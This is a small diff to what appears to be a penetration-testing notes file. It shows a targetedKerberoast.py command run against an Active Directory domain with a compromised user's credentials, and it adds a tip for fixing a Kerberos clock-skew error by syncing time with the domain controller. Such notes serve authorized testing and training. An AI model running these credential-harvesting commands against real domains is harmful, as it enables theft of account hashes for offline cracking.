@@ -20,3 +20,11 @@ https://github.com/ShutdownRepo/targetedKerberoast.git
 ```
 targetedKerberoast.py -v -d '<domain>' -u '<Owned USer>' -p '<password>'
 ```
+In case of below error
+```
+[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+Simply do
+```
+sudo ntpdate <Domain controller>
+```
